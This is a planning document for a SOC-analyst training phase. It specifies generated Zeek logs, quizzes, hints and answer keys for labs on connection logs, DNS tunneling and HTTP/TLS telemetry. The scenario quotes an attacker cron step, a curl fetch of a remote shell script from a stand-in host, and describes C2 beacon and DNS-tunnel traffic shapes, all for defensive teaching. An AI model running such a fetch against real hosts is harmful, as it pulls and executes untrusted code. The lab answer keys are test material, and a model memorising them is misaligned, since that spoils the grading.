# SOC Track — Phase 2 Build Plan (v1)

**Mode:** plan only — produced 2026-07-18 per Phase Builder step 3 (PROMPTS.md Prompt 2),
inside a PLAN-AHEAD session that plans every remaining soc phase one at a time.
**This document is the deliverable for `docs/plans/soc-p2-plan.md`** (saved there verbatim on go-ahead).
**Binding content spec:** `docs/curriculum/soc-analyst-lab-curriculum-v1.md` — Phase 2 (§6, lines 150–163).
**Binding mechanical spec:** `docs/kit-contracts.md` + the soc quality gates in `PROMPTS.md`.
**Predecessor plan (inherited conventions):** `docs/plans/soc-p01-plan.md` — its §1 (Coppermine
universe), §2 (`tools/genevidence/`), §2.1 (canonical grading pattern), §2.2 (canonical
event/rule registry) are load-bearing here and are **not** re-derived; this plan extends them.
**Scope:** 7 labs — L2.1–L2.7 (gate L2.7) — plus the `tools/genevidence/` emitter extensions
(zeek `http`/`ssl` TSV, HTTP/TCP pcap, jittered-beacon conn series) that Phase 2 evidence needs.

## 0. Ground rules this plan follows

Identical to `soc-p01-plan.md` §0, restated so this file stands alone:

- Lab list is **map-exact**: ids, titles, types, gate placement — no deviations proposed (§150–162).
- Evidence is **generated, never hand-written** (PROMPTS.md soc gate): each scenario is a
  `scenario.yaml`; the generator emits BOTH the evidence files AND the answer key from that single
  source of truth, so keys can never drift from evidence.
- Every lab is gradeable **offline inside the check fence** (`env -i`, no network, stdin `/dev/null`,
  120s, no absolute paths, checklib helpers + `ck_summary` last).
- Raw evidence files are **never defanged** (zeek TSVs, pcaps, alerts must look authentic to triage);
  all prose (lab.md briefs, narratives), all answer keys, and every required learner submission **do**
  defang IOCs — final-dot-bracket domains (`c2.stonewick[.]example`), bracketed IPs
  (`203.0.113[.]66`), `hxxp://`/`hxxps://`. This is the L0.2 graded rule, held here for HUNT answers
  that are themselves IOCs.
- **Flat-file first:** every lab grades against files in `files/` (→ workspace), no VM required. The
  map's optional **Security Onion overlay** (§60–62) is realized here on three labs (L2.4/L2.5/L2.7)
  as an **ungraded** appendix only — the flat-file path is always the graded path (§Decisions D4).
- ADHD contract: one concept per lab, est 10–20 min, zero prerequisite reading.

## 1. Universe additions — the network plane

Phase 2 is the first phase whose evidence is **primarily network telemetry**, so it thickens the
Coppermine universe's network layer. Everything below is additive to `soc-p01-plan.md` §1; no entity
is redefined. Single source stays `tools/genevidence/universe.yaml`.

- **Zeek sensor placement.** One Zeek instance monitors the perimeter span at the WEB01 NAT egress
  (`192.0.2.44`) and the internal server/workstation VLANs. It writes classic TSV logs
  `conn.log`, `dns.log`, `http.log`, `ssl.log` — `#fields`/`#types` headers, tab-separated,
  `-` for unset, epoch or ISO `ts` (this plan uses ISO UTC in `ts` for learner readability, stated
  in each lab). Every row carries a `uid` (the Zeek connection id) and a Coppermine `event_id`
  (`CM-<MMDD>-<seq>`) appended as the last field so network evidence grounds the same way endpoint
  evidence does.
- **Benign network fixtures** (declared once, reused so no lab invents ad-hoc IPs):
  - `saas.mail.example` `192.0.2.60` — hosted webmail, steady 443/tcp TLS all day (benign beacon-shaped
    poll every 900s — the "looks periodic, is boring" discriminator for L2.6).
  - NTP `192.0.2.10` :123/udp — corp time sync, fixed ~64s cadence (the L1.7-c6 benign "beacon").
  - `updates.example` `192.0.2.61` on **shared hosting** (declared shared so Phase 4's
    "reputation is not a verdict" has an anchor; L2.3/L2.5 use it as a benign 200/301 web session).
  - Research scanner `192.0.2.199`, Bluewater pentest `192.0.2.150`, VPN gw `192.0.2.45` — unchanged
    from §1.
- **Attacker network infra** (unchanged values, network-plane views added):
  - C2 `203.0.113.66` = `c2.stonewick.example`, reached over **443/tcp TLS, SNI
    `c2.stonewick.example`** — the M2 beacon, 300s ±10% jitter, from WKS-ACCT-07 `10.20.30.107`
    starting `2026-03-11T15:46:02Z`.
  - Payload host `198.51.100.23` = `cdn.stonewick.example`, reached over **plaintext 80/tcp HTTP**
    for the WEB01 cron pull `GET /u.sh` (from L1.8 CM-A-55, `curl hxxp://cdn.stonewick.example/u.sh`),
    every 600s from WEB01 `10.20.10.20` starting `2026-03-12T20:16:00Z`. **This is the only plaintext
    HTTP attacker fetch in the universe** — it is what makes L2.4 (tshark reads the URI) and L2.3
    (HTTP vs TLS visibility) possible: HTTPS to C2 hides the URI, HTTP to the payload host does not.
  - DNS-tunnel zone `tun.stonewick.example` — WKS-ENG-12 `10.20.31.112` bursts long random-label
    TXT/A queries, NXDOMAIN-heavy, from `2026-03-12T09:00:00Z` (motif M3).
- **Cross-plane continuity (stated, not re-emitted):** the M2 beacon that Phase 1 saw as endpoint
  Sysmon-3 (`CM-0311-0179`, powershell → 203.0.113.66:443) is the **same** connection Phase 2 sees as
  a Zeek conn/ssl row (`CM-0311-0501`, below). Two sensors, one beacon — the teaching payoff of L2.5
  and the gate.

## 2. Generator extensions — `tools/genevidence/`

The generator **core** (`genevidence.py`, `universe.yaml`, `verify.py`, the ecs-jsonl / zeek-conn-tsv
/ zeek-dns-tsv / syslog / alert-json / pcap emitters) is built in the p0/p1 session and is a
**prerequisite** — Phase 2 cannot build until `soc-p0`/`soc-p1` are tagged. Phase 2 adds four
emitters + one verify invariant, all authoring-time only (learners never run them):

1. **`zeek_http_tsv`** — emits `http.log` rows: `ts uid id.orig_h id.orig_p id.resp_h id.resp_p
   method host uri user_agent status_code request_body_len response_body_len event_id`.
2. **`zeek_ssl_tsv`** — emits `ssl.log` rows: `ts uid id.orig_h id.orig_p id.resp_h id.resp_p
   version cipher server_name(SNI) resumed established event_id`. SNI is the load-bearing field.
3. **`http_pcap`** (scapy) — a small plaintext HTTP-over-TCP capture: DNS A exchange + TCP 3-way +
   one `GET`/`200` with a readable body. Reused by L2.4 and the L2.7 gate. Keeps the same
   `t0 + step` deterministic-timestamp discipline as the L0.1 dns_pcap.
4. **`beacon_conn_series`** — emits a run of `conn.log` rows for one 5-tuple at a base period with a
   **seeded, deterministic** jitter sequence (no `random` at emit time — jitter offsets are a fixed
   list in the scenario yaml, so re-runs are byte-identical and `verify.py` is reproducible). Used
   for the M2 300s±10% beacon, the NTP 64s cadence, and the saas 900s poll.
5. **`verify.py` additions:** (a) **uid consistency** — any `uid` appearing in more than one Zeek log
   describes the same 5-tuple in every log; (b) **pcap↔zeek agreement** (L2.7) — every qname/host/IP
   in the gate pcap appears in the gate's zeek bundle and vice-versa; (c) existing invariants
   (timestamps in-window, IPs/hosts resolve to universe entities, answer-key event ids present in
   evidence, raw artifacts carry no defanged forms, prose carries no un-defanged IOCs) run unchanged.

Grading conventions are inherited verbatim: the **§2.1 canonical pattern** (presence check →
normalize-once-in-plain-bash to `.answers.norm` → one anchored `assert_file_contains` per question,
keys decoded from a generator-written `# --- BEGIN/END GENERATED KEY ---` base64 block → `ck_summary`
last) and the **`harness_err`-only-for-corrupt-key** rule. One Phase-2-specific addition to the
recipe, pinned here so no builder trips on it:

> **Defanged-IOC keys need regex escaping.** Several Phase 2 answers are defanged IOCs whose tokens
> contain ERE metacharacters (`c2.stonewick[.]example`, `203.0.113[.]66`). When check.sh builds the
> anchored pattern from a decoded key, it must escape `.`, `[`, `]` first, e.g.
> `esc=$(printf '%s' "$KEY" | sed 's/[][.]/\\&/g'); assert_file_contains ".answers.norm" "^q3=$esc$"`.
> The L1.2 precedent (`'^q3=source\.ip$'`) already escapes dots; this just extends it to brackets.
> Non-IOC token answers (slugs, event ids, counts, ports, single letters) need no escaping.

## 2.1 Canonical id additions (binding — extends `soc-p01-plan.md` §2.2)

Phase 2 mints **network-plane** event ids. To avoid the cross-scenario collisions §2.2 warns about,
all *new* Phase 2 network events are allocated in the **`CM-<MMDD>-05xx`+ band** (Phase 1 used
`0002`–`0245` and `0301`–`0460`; the 05xx band is unused). Rule ids stay `CM-R-<nnnn>`. Two Phase 1
ids are **reused verbatim** because they are the same event seen on the network plane:

| Canonical id | Event | Origin | Reused by |
|---|---|---|---|
| `CM-0312-0310/0311/0312` | M3 zeek-dns tunnel bursts, WKS-ENG-12 → `tun.stonewick.example`, NXDOMAIN | pinned in L1.8 (`index=zeek_dns`) | L2.2, L2.7 |
| `CM-0311-0179` | M2 beacon, **endpoint** view (Sysmon 3, powershell → 203.0.113.66:443) | L1.7 c5 | referenced by L2.5/L2.7 as the cross-plane twin (not re-emitted) |

New canon pinned by this phase (reused across L2.5/L2.6/L2.7 so the beacon story is one story):

| Canonical id | Event |
|---|---|
| `CM-0311-0500` | M2 pre-beacon DNS: zeek `dns` A `c2.stonewick.example` from `10.20.30.107`, `2026-03-11T15:45:58Z` → `203.0.113.66` |
| `CM-0311-0501` | M2 beacon, **network** view: zeek `conn` row `10.20.30.107`→`203.0.113.66:443/tcp ssl`, `2026-03-11T15:46:02Z` (first beacon; SF) |
| `CM-0311-0502` | M2 beacon TLS: zeek `ssl` row for the same `uid`, `server_name=c2.stonewick.example` |
| `CM-0312-0520/0521/0522` | WEB01 → `cdn.stonewick.example` HTTP `GET /u.sh` pulls (600s cron), zeek `http`/`conn` |

Rule ids introduced: `CM-R-0171` (high-entropy subdomain burst — reused from L1.8 CM-A-53) and the
beacon rule `CM-R-0155` (fixed/near-fixed interval C2 — reused from L1.7 c6's rule id) are referenced,
not re-minted. Any new Phase 2 alert stub uses `CM-A-2xx`.

A build-time entry appended to `tools/genevidence/universe-events.yaml` (the shared registry §2.2
calls for) encodes this table so p3+ import these ids instead of re-minting them.

## 3. Decisions & flagged deviations (approve/veto with the plan)

1. **Zeek `ts` rendered as ISO-8601 UTC, not epoch.** Real Zeek writes epoch floats in `ts`.
   Decision: emit ISO UTC in the learner-facing `ts` field (with a one-line note in each lab that
   production Zeek uses epoch and `zeek-cut`/`jq` normalize it), keeping the phase readable without a
   conversion detour that L1.2 already owns. `#types` header still labels it `time`. Flag to veto if
   you want raw epoch + a conversion beat instead.
2. **HTTP vs HTTPS split is deliberate, not incidental.** C2 is TLS-only (URI hidden → SNI is all you
   get, L2.3); the payload host is plaintext HTTP (URI readable, L2.4). This is the pedagogical spine
   of the phase's "what network telemetry can and cannot see." It reuses existing universe facts
   (L1.8's `curl hxxp://cdn.stonewick.example/u.sh`) — no new attacker capability invented.
3. **L2.4 (GUIDED, tshark) grades produced tshark outputs + an answers.txt of carved facts** — the
   L0.1 precedent for GUIDED (grade real artifacts, installs/reads run live, grading offline). No
   live capture is ever graded; the pcap ships in `files/`.
4. **Security Onion overlay = ungraded appendix on L2.4/L2.5/L2.7 only.** The map (§60–62, §267) makes
   SO optional on selected labs; Phase 2 (network triage in a Hunt UI) is the natural home. Each of the
   three labs gets a `## SECURITY ONION (OPTIONAL)` section in lab.md: the same investigation run
   through the `cardinal-so` Hunt UI, explicitly "not graded, VM optional, flat-file path above is the
   graded path." No check.sh ever references the VM. Veto to drop SO entirely or to promote it.
5. **Defanged IOCs are valid graded answers in HUNT labs.** Phase 1's answers were tokens/event ids;
   Phase 2 HUNT answers include the C2 domain, tunnel zone, and C2 IP. Per defang discipline these are
   submitted and keyed **defanged** (`c2.stonewick[.]example`, `203.0.113[.]66`), graded with the
   §2 regex-escape recipe. Answer grammar comments in every template state the defang requirement so a
   correct-but-fanged answer fails loudly and teaches the habit.
6. **Python + scapy stay authoring-time only** (unchanged from §3.6 of the predecessor); the four new
   emitters are committed and re-runnable; learners need only `jq`, `tshark`, `rg`, `sort`/`awk`.

## 3.5 Self-review corrections applied

Drafting this phase surfaced four issues, fixed in-text rather than left to the builder:

- **Beacon-count off-by-one.** A 300s beacon from 15:46:02Z to a scenario-week edge yields a specific
  integer count; an early draft keyed "≈12" as an exact answer. Fixed: L2.6/L2.7 key the **count as a
  generator-emitted integer** (the beacon series length is a scenario constant), and the quiz asks for
  the *shape* (periodic + jitter), never a hand-counted total — so the key can never drift from the
  emitted row count. `verify.py` asserts `len(beacon_rows) == answer_key.count`.
- **NTP as false beacon must be reachable in the same log.** L2.6's discriminator only works if the
  benign NTP cadence and the malicious C2 cadence live in **one** `conn.log`. Fixed: `s2-beaconing`
  emits both (plus the saas 900s poll) into a single conn.log, so the learner's `awk` delta pass sees
  all three and must reason about *which* periodicity is hostile — not just "find the periodic one."
- **uid must actually join in L2.5.** The whole L2.5 concept collapses if the `uid` in dns.log/http.log
  doesn't match conn.log. Fixed: the `beacon_conn_series`/`zeek_*_tsv` emitters share one `uid` per
  logical connection, and `verify.py`'s new uid-consistency invariant is a hard gate before commit.
- **SNI is unset on resumed TLS.** Real TLS session resumption omits SNI. To keep L2.3 q-on-SNI
  unambiguous, the M2 beacon's *first* ssl row (`CM-0311-0502`) is a full handshake with
  `server_name=c2.stonewick.example` and `resumed=F`; later beacon rows may resume — the lab points q
  at the first row explicitly.

---

## 4. Phase 2 — labs

### L2.1 — Ports, protocols, and conversations — reading a connection log like a sentence

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L2.1 | Ports, protocols, and conversations — reading a connection log like a sentence | DECODE | false | 15 |

Dir `tracks/soc/phases/p2/L2.1-conn-reading/`. **One concept:** a `conn.log` row is a sentence —
*who* spoke to *whom*, on *what port/service*, for *how long*, *how many bytes each way*, and *how the
conversation ended* (`conn_state`). Reading, not hunting (that is L2.6).

**TEACHING ARTIFACT**
- **Files staged** (`files/` → workspace; all generated from `s2-conn-reading`, RAW = never defanged):
  - `conn.log` — zeek TSV, header
    `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes conn_state history event_id`,
    9 rows, `2026-03-11T13:58:00Z … 15:47:00Z`:
    1. `10.20.30.107 → 192.0.2.60:443 tcp ssl` 42.3s 4201/8830 **SF** (m.reyes webmail — normal) `CM-0311-0510`
    2. `10.20.30.107 → 10.20.10.5:53 udp dns` 0.01s 76/142 **SF** `CM-0311-0511`
    3. `10.20.30.103 → 192.0.2.10:123 udp -` 0.00s 76/76 **S0** (NTP, no service label — teaches `-`) `CM-0311-0512`
    4. `10.20.31.112 → 10.20.10.5:53 udp dns` 0.01s 88/0 **S0** (query, no response row here) `CM-0311-0513`
    5. `10.20.30.107 → 203.0.113.66:443 tcp ssl` **0.31s 517/1203 SF** (the M2 beacon, first hit — the odd
       one out: external, short, tiny, repeating later) `CM-0311-0501`
    6. `192.0.2.199 → 10.20.10.20:22 tcp -` 0.00s 0/0 **REJ** (scanner, rejected — teaches REJ) `CM-0311-0514`
    7. `192.0.2.199 → 10.20.10.20:80 tcp http` 0.05s 88/240 **RSTO** (scanner, reset) `CM-0311-0515`
    8. `10.20.10.9 → 10.20.10.8:445 tcp -` 3.10s 1.2M/9k **SF** (svc_backup robocopy — big, benign) `CM-0311-0516`
    9. `10.20.30.107 → 203.0.113.66:443 tcp ssl` 0.29s 511/1198 **SF** (2nd beacon, 300s later) `CM-0311-0517`
  - `conn-state-legend.md` — static cheat-sheet: `SF` normal establish+teardown, `S0` no reply seen,
    `REJ` connection rejected, `RSTO`/`RSTR` reset by originator/responder, `OTH` other; plus the
    5-tuple and `orig_bytes`/`resp_bytes` direction reminder. (Documentation, generator-exempt like
    L0.2's README.)
  - `answers.template.txt` — `q1=`…`q6=` with grammar comments.
- **Learner task:** `head -3 conn.log` to read the `#fields`; `zeek-cut`-free `awk`/`column -t` to
  line it up; answer from the rows. Template + keyed grammar:
  ```
  q1=   # uid of the row where the scanner's connection was REJECTED           -> (the uid string)
  q2=   # conn_state of the svc_backup 445/tcp copy (one token, e.g. sf)       -> sf
  q3=   # service label of row 5 (the short external 443 conversation)         -> ssl
  q4=   # resp bytes the beacon's first hit received                            -> 1203
  q5=   # the ONE external dst IP a workstation opened a 443 session to that is
        #   NOT saas webmail — DEFANGED (e.g. 198.51.100[.]23)                 -> 203.0.113[.]66
  q6=   # how many rows use conn_state S0 (no reply seen)                       -> 2
  ```
  (q1 uses the row's generated `uid`; the generator writes that exact uid into the key block, so it
  can never drift.)
- **Grading** (`check.sh`, §2.1 canonical): `assert_file_exists answers.txt`; `assert_file_exists
  conn.log`; presence `^q1=`…`^q6=`; normalize → `.answers.norm`; six anchored `assert_file_contains`
  from decoded keys (`q5` uses the bracket-escape recipe §2); `ck_summary` last. Key block
  `# --- BEGIN GENERATED KEY (genevidence: s2-conn-reading) ---` holds `KEY_Q1..KEY_Q6` base64.
- **Kit files:**
  - `meta.json`: `{id:"L2.1", title:<map>, type:"DECODE", objective:"Read a zeek conn.log row as a
    sentence — 5-tuple, service, duration, byte direction, and conn_state — and pick the odd
    conversation out", gate:false, est_minutes:15}`
  - `quiz.json` (3, base64 answers):
    1. (choice) "`orig_bytes` and `resp_bytes` are counted from whose point of view?" a) the responder
       b) the originator (the host that opened the connection) c) the sensor d) always the server → **b**
    2. (choice) "A row shows `conn_state S0`. What happened?" a) normal close b) the originator sent
       but no reply was ever seen c) the responder reset it d) a full file transfer → **b**
    3. (choice) "Two 443/tcp `ssl` rows: one is 42s / 4KB↔8KB, the other 0.3s / 517B↔1.2KB and repeats
       5 minutes later. Which smells like automation, not a human?" a) the 42s session b) the short
       repeating one c) neither — both are TLS d) can't tell from conn.log → **b**
  - `hints.json`: L1 "Read the `#fields` header first; every answer is one column of one row. Line the
    file up with `column -t conn.log`." L2 "`conn_state` is the last-but-two column; the legend file
    decodes SF/S0/REJ/RSTO. `orig_bytes` is what the *opener* sent. For q5, a workstation opening 443
    to an external IP that isn't 192.0.2.60 is the tell — and your answer must be defanged." L3 "q1:
    the REJ row is the scanner→WEB01:22; copy its uid. q2: the 445 copy is SF. q3: row 5's service is
    ssl. q4: resp_bytes of row 5 is 1203. q5: 203.0.113[.]66. q6: count S0 rows — there are two."
  - `recap.md` (3 lines): `A conn.log row is a full sentence: who → whom, port/service, duration, bytes
    each way, and how it ended.` / `conn_state is the verb — SF normal, S0 no reply, REJ rejected,
    RSTO/RSTR reset — and it often carries the verdict.` / `Short, tiny, repeating external TLS
    sessions read as automation; long human sessions move real bytes.`
  - **`recall.json`** (phase opener; 5, non-gating; **[VERIFY-AT-BUILD]** — Phase 1 is unbuilt, so
    these are sourced from the curriculum map's Phase 1 lab list (§137–144) and reconciled against the
    parked L2.1 draft in `soc-p01-plan.md` L1.8; re-verify against real P1 content when P1 is built):
    1. (choice) "Order the alert pipeline." a) adversary action → telemetry → log → normalized event →
       detection rule → alert; b) alert → rule → telemetry → action; c) telemetry → alert → action →
       action → normalized event → *(sic)* → **key a** — source **L1.1** (Telemetry sources / pipeline).
    2. (choice) "`svc_backup`'s 02:00Z robocopy to FS01 trips a mass-file-copy rule — tp, fp, or btp?"
       → **key btp** — source **L1.7** (disposition taxonomy).
    3. (text) "Which top-level Sigma section combines the named selections into firing logic?" →
       **key `condition`** — source **L1.4** (reading a Sigma rule).
    4. (text) "ATT&CK technique id for WINWORD.EXE spawning `powershell.exe -enc`?" →
       **key `t1059.001`** — source **L1.5** (MITRE ATT&CK mapping).
    5. (text) "Which alert field lists the raw event ids that let you verify the alert against
       evidence?" → **key `evidence.event_ids`** — source **L1.3** (anatomy of an alert).

**EVIDENCE SPEC**
```yaml
scenario: s2-conn-reading            # tools/genevidence/s2-conn-reading.yaml
lab: L2.1
window: {start: 2026-03-11T13:58:00Z, end: 2026-03-11T15:47:00Z}
actors: [m.reyes, j.walsh, d.okafor, svc_backup]
hosts: {DC01: 10.20.10.5, FS01: 10.20.10.8, SRV-BACKUP: 10.20.10.9, WEB01: 10.20.10.20,
        WKS-ACCT-07: 10.20.30.107, WKS-HD-03: 10.20.30.103, WKS-ENG-12: 10.20.31.112}
externals: {webmail: 192.0.2.60, ntp: 192.0.2.10, scanner: 192.0.2.199, c2: 203.0.113.66}
benign_background:
  - {ts: 2026-03-11T13:58:00Z, row: 1, desc: m.reyes webmail 443 SF, id: CM-0311-0510}
  - {ts: 2026-03-11T14:30:00Z, row: 3, desc: NTP S0, id: CM-0311-0512}
  - {ts: 2026-03-11T15:10:00Z, row: 6-7, desc: scanner REJ+RSTO on WEB01, id: [CM-0311-0514, CM-0311-0515]}
  - {ts: 2026-03-11T02:00:14Z, row: 8, desc: svc_backup robocopy 445 SF (shown for contrast), id: CM-0311-0516}
attacker_actions:
  - {ts: 2026-03-11T15:46:02Z, row: 5, motif: M2, desc: beacon #1 10.20.30.107->203.0.113.66:443 ssl SF,
     orig_bytes: 517, resp_bytes: 1203, id: CM-0311-0501}
  - {ts: 2026-03-11T15:51:02Z, row: 9, motif: M2, desc: beacon #2 (300s later), id: CM-0311-0517}
emit:
  conn_log: files/conn.log                     # 9 rows, tab-separated, with #fields/#types headers
  legend:   files/conn-state-legend.md         # static
  answers_template: files/answers.template.txt
answer_key:                                    # generator writes base64 KEY_Q1..Q6 into check.sh
  q1: <uid-of-CM-0311-0514>                     # REJ scanner row; generator fills the real uid
  q2: sf
  q3: ssl
  q4: "1203"
  q5: 203.0.113[.]66                            # DEFANGED IOC (regex-escape recipe on grade)
  q6: "2"
verify:
  - all ts in window; every id.resp_h/id.orig_h resolves to a universe entity
  - exactly two rows carry conn_state S0; exactly one external non-webmail 443 dst exists (203.0.113.66)
```

---

### L2.2 — DNS, the analyst's favorite log — queries, NXDOMAIN storms, tunneling signs, DGA smell

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L2.2 | DNS, the analyst's favorite log — queries, NXDOMAIN storms, tunneling signs, DGA smell | HUNT | false | 20 |

Dir `tracks/soc/phases/p2/L2.2-dns-hunt/`. **One concept:** DNS abuse has *shapes* — the tunnel
(long, high-entropy labels under one zone, TXT-heavy, NXDOMAIN-heavy, high rate from one host) versus
benign NXDOMAIN noise (wpad, typo'd single lookups). Find the tunnel in the haystack.

**TEACHING ARTIFACT**
- **Files staged** (`files/`; generated `s2-dns-hunt`, RAW):
  - `dns.log` — zeek TSV,
    `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto query qtype_name rcode_name answers event_id`,
    ~60 rows over `2026-03-12T09:00:00Z … 09:20:00Z`. Composition:
    - **~40 tunnel rows** from `10.20.31.112` (WKS-ENG-12): `query` = `<24–32 random hex/base32
      label>.tun.stonewick.example`, `qtype_name` mostly `TXT` (some `A`), `rcode_name` `NXDOMAIN`
      (a few `NOERROR` with a short TXT answer). Canonical ids `CM-0312-0310/0311/0312` seed the run;
      the remaining rows extend the 05xx band. This is motif M3.
    - **benign NXDOMAIN noise:** 4 `wpad.coppermine.example` NXDOMAIN (browsers, various hosts);
      2 typo lookups (`fs10.coppermine.example`, `dc10.coppermine.example`) NXDOMAIN.
    - **benign NOERROR:** `saas.mail.example`, `coppermine.example` SOA, `updates.example`,
      internal `fs01.`/`dc01.` — normal.
  - `qnames.txt` — a convenience extract note in lab.md, not a file (learner builds it with `zeek-cut`
    /`awk`); keeps `files/` to the raw log + template.
  - `answers.template.txt`.
- **Learner task:** hunt with `awk`/`sort`/`uniq -c`/`rg`. Find: which host, which zone, the shape.
  Template + grammar:
  ```
  q1=   # source IP doing the tunneling — DEFANGED (e.g. 10.20.31[.]112)          -> 10.20.31[.]112
  q2=   # the tunnel zone (parent domain shared by the random labels) — DEFANGED  -> tun.stonewick[.]example
  q3=   # dominant qtype of the tunnel traffic (one token)                        -> txt
  q4=   # dominant rcode of the tunnel traffic (one token)                        -> nxdomain
  q5=   # count of tunnel-zone queries from that host                             -> <generator int>
  q6=   # one event_id of a tunnel query (cm-mmdd-nnnn)                            -> cm-0312-0310
  ```
- **Grading** (`check.sh`, §2.1): presence + normalize; anchored checks with the bracket-escape recipe
  for q1/q2; `q5` is the generator-emitted tunnel-row count (keyed as an integer, `verify.py` asserts
  it equals the emitted row count); `q6` accepts any one of the three canonical tunnel ids via an ERE
  alternation `^q6=(cm-0312-0310|cm-0312-0311|cm-0312-0312)$` decoded from the key block. `ck_summary`
  last.
- **Kit files:**
  - `meta.json`: `{id:"L2.2", type:"HUNT", objective:"Find a DNS tunnel in a query log by its shape —
    one host, one zone, long random labels, TXT + NXDOMAIN at high rate — and separate it from benign
    NXDOMAIN noise", gate:false, est_minutes:20}`
  - `quiz.json`:
    1. (choice) "Dozens of NXDOMAIN for `wpad.coppermine.example` from many hosts is usually:" a) a
       tunnel b) benign browser proxy-autoconfig lookups c) a DGA d) exfiltration → **b**
    2. (choice) "What most distinguishes tunneling from a broken-app NXDOMAIN storm?" a) tunneling uses
       long high-entropy labels under one zone from one host, carrying data b) tunneling always uses
       port 53 c) storms only happen at night d) tunneling never returns NOERROR → **a**
    3. (text) "A single host sends hundreds of `TXT` queries for random labels under one domain and
       mostly gets NXDOMAIN. One word for what that domain's authoritative server is being used as?" →
       **key `tunnel`** (accept `c2`, `channel`)
  - `hints.json`: L1 "Count queries per source host (`awk '{print $3}' … | sort | uniq -c`). One host
    dwarfs the rest — start there." L2 "Strip each qname to its last two labels to find the shared
    parent zone; the tunnel's labels are long and random, its qtype and rcode both repeat. Your IOC
    answers must be defanged." L3 "Host 10.20.31[.]112, zone tun.stonewick[.]example, qtype txt, rcode
    nxdomain; q5 is that host's tunnel-zone query count; any tunnel row's event_id works for q6."
  - `recap.md` (3 lines): `DNS abuse has a shape: one host, one zone, long high-entropy labels, TXT and
    NXDOMAIN at volume — that is a tunnel, a covert channel over port 53.` / `Benign NXDOMAIN storms
    (wpad, typos) come from many hosts with short, meaningful names — count per source before you
    conclude anything.` / `The authoritative server for the tunnel zone is the attacker's C2 endpoint;
    the zone itself is the durable indicator.`
  - No `recall.json` (L2.1 is the phase opener).

**EVIDENCE SPEC**
```yaml
scenario: s2-dns-hunt                # tools/genevidence/s2-dns-hunt.yaml
lab: L2.2
window: {start: 2026-03-12T09:00:00Z, end: 2026-03-12T09:20:00Z}
actors: [d.okafor]                   # WKS-ENG-12 is d.okafor's host
hosts: {DC01: 10.20.10.5, WKS-ENG-12: 10.20.31.112, WKS-ACCT-07: 10.20.30.107, WKS-HD-03: 10.20.30.103}
externals: {resolver: 10.20.10.5}
attacker: {tunnel_zone: tun.stonewick.example, c2_ns: 203.0.113.66}
benign_background:
  - {kind: wpad_nxdomain, count: 4, hosts: [10.20.30.107, 10.20.30.103, 10.20.31.112], rcode: NXDOMAIN}
  - {kind: typo_nxdomain, queries: [fs10.coppermine.example, dc10.coppermine.example], rcode: NXDOMAIN}
  - {kind: benign_noerror, queries: [saas.mail.example, coppermine.example/SOA, updates.example, fs01., dc01.]}
attacker_actions:
  - {t: 2026-03-12T09:00:00Z+, motif: M3, src: 10.20.31.112, zone: tun.stonewick.example,
     qtype: TXT(+some A), rcode: NXDOMAIN(+few NOERROR), rows: ~40, seed_ids: [CM-0312-0310, CM-0312-0311, CM-0312-0312]}
emit:
  dns_log: files/dns.log
  answers_template: files/answers.template.txt
answer_key:
  q1: 10.20.31[.]112                 # DEFANGED
  q2: tun.stonewick[.]example        # DEFANGED
  q3: txt
  q4: nxdomain
  q5: "<tunnel_row_count>"           # generator-emitted integer; verify.py asserts == len(tunnel rows)
  q6: (cm-0312-0310|cm-0312-0311|cm-0312-0312)
verify:
  - tunnel rows all share id.orig_h 10.20.31.112 and the tun.stonewick.example parent zone
  - q5 integer equals the emitted tunnel-row count exactly
  - wpad/typo NXDOMAIN come from >1 host (so per-source counting separates them)
```

---

### L2.3 — HTTP and TLS in logs — methods, status codes, user-agents, SNI

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L2.3 | HTTP and TLS in logs — methods, status codes, user-agents, SNI | DECODE | false | 15 |

Dir `tracks/soc/phases/p2/L2.3-http-tls/`. **One concept:** HTTP exposes the request (method, host,
URI, user-agent, status); HTTPS hides the URI, so **SNI/`server_name`** is the destination signal you
still get. Read both, know which fields survive encryption.

**TEACHING ARTIFACT**
- **Files staged** (`files/`; generated `s2-http-tls`, RAW):
  - `http.log` — zeek TSV,
    `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p method host uri user_agent status_code request_body_len response_body_len event_id`,
    7 rows:
    - benign browsing: `10.20.30.103 → updates.example GET /patch/index.html … Mozilla/5.0 (Windows NT
      10.0…) 200` and a `301` redirect row (teaches 3xx).
    - benign: `GET /favicon.ico … 404` (teaches 4xx is not automatically evil).
    - **suspicious:** `10.20.10.20 (WEB01) → cdn.stonewick.example GET /u.sh` UA `curl/7.81.0`
      `200`, tiny request / small script response (`CM-0312-0520`) — the plaintext payload pull.
    - **suspicious UA:** one `POST` to `updates.example /telemetry` with UA
      `Mozilla/5.0 (WindowsPowerShell/5.1)` (the M2 cradle UA, indicator i5 from L1.6) `200`.
  - `ssl.log` — zeek TSV,
    `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p version cipher server_name resumed established event_id`,
    4 rows:
    - benign `10.20.30.107 → 192.0.2.60 TLS1.3 … server_name saas.mail.example established T resumed F`.
    - **M2 beacon** `10.20.30.107 → 203.0.113.66 TLS1.2 … server_name c2.stonewick.example established
      T resumed F` (`CM-0311-0502`; **first** handshake, SNI present — see §3.5).
    - a `resumed T` beacon row with `server_name -` (teaches SNI-absent-on-resume; the lab points q at
      the first row).
    - benign `updates.example` TLS row.
  - `answers.template.txt`.
- **Learner task:** read both logs; answer. Template + grammar:
  ```
  q1=   # status code of the /u.sh payload pull                              -> 200
  q2=   # the SNI (server_name) of the beacon's first TLS handshake — DEFANGED-> c2.stonewick[.]example
  q3=   # the user-agent string that is a scripting engine, not a browser
        #   (verbatim, lowercased)                                            -> mozilla/5.0 (windowspowershell/5.1)
  q4=   # HTTP method used to send data TO the server in the suspicious row   -> post
  q5=   # in the resumed TLS row, what is server_name? (one token)            -> -
  q6=   # which log would you use to find the destination hostname of an
        #   HTTPS session: http or ssl                                        -> ssl
  ```
- **Grading** (`check.sh`, §2.1): presence + normalize; anchored checks; q2 defanged (bracket-escape);
  q3 normalized lowercase (the `(` `)` and `/` survive `tr`/`sed`; no regex metachar issue beyond the
  `.`/`(`/`)` — escape them via the §2 recipe extended to `()`); `ck_summary` last.
- **Kit files:**
